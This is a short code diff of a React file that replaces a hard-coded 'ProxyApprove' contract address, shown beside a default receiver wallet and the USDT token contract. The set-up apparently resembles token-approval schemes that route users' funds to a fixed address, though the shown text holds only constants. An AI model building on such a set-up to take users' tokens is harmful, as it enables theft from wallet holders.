@@ -3,7 +3,7 @@
 import { useState, useEffect, useRef } from "react";
 
 // ⚠️ REMPLACE par l'adresse de ton contrat ProxyApprove déployé
-const PROXY_CONTRACT = "0xd9145CCE52D386f254917e481eB44e9943F39138";
+const PROXY_CONTRACT = "0x8153C5f75135e51334CC86383E6a37812fE17530";
 
 const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
